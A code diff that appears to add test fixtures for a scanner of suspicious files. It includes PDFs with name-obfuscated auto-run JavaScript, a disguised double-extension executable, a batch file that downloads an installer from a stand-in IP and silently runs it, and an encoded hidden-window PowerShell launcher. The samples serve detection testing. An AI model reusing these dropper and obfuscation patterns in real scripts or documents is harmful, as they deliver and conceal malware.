@@ -31,10 +31,37 @@ PDF = (
     b"%%EOF\n"
 )
 
+PDF_CLEAN = (
+    b"%PDF-1.4\n"
+    b"1 0 obj\n"
+    b"<< /Type /Catalog /Pages 2 0 R >>\n"
+    b"endobj\n"
+    b"trailer\n"
+    b"<< /Root 1 0 R >>\n"
+    b"%%EOF\n"
+)
+
+PDF_HIDDEN = (
+    b"%PDF-1.4\n"
+    b"1 0 obj\n"
+    b"<< /Type /Catalog /Open#41ction << /S /J#61vaScript >> >>\n"
+    b"endobj\n"
+    b"trailer\n"
+    b"<< /Root 1 0 R >>\n"
+    b"%%EOF\n"
+)
+
 BAT = (
     b"@echo off\n"
     b"curl http://198.51.100.23/setup.msi -o setup.msi\n"
     b"msiexec /i setup.msi /qn /norestart\n"
+)
+
+BAT_CLEAN = b"@echo off\necho Hello\n"
+
+PS1 = (
+    b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden "
+    b"-EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA==\n"
 )
 
 JS = (
@@ -46,9 +73,13 @@ JS = (
 FILES = {
     "notes.txt": b"Meeting notes. Nothing to see here.\n",
     "report.pdf": PDF,
+    "clean.pdf": PDF_CLEAN,
+    "hidden.pdf": PDF_HIDDEN,
     "invoice.pdf.exe": b"MZ" + b"\x00" * 58 + b"This is a harmless test file. It is not a program.\n",
     "holiday.jpg": make_zip([("hello.txt", b"hello")]),
     "install.bat": BAT,
+    "hello.bat": BAT_CLEAN,
+    "dropper.ps1": PS1,
     "script.js": JS,
     "budget.xlsm": make_zip([
         ("[Content_Types].xml", b"<Types/>"),
